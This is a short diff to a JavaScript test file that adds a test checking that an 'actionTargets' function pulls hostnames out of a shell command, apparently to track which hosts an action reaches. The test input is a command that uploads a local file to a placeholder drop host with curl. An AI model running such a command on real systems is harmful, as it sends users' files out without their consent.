@@ -161,6 +161,14 @@ describe("actionTargets", () => {
     expectLinearTime(() => actionTargets({ to: value }));
   });
 
+  it("reads the hosts a command's links reach", () => {
+    expect(
+      actionTargets({
+        command: "npm test && curl -d @out.txt 'https://Drop.example.net/up?x=1', ls",
+      }).map((target) => target.value),
+    ).toEqual(["drop.example.net"]);
+  });
+
   it("reads recipients from nested batches", () => {
     expect(
       actionTargets({
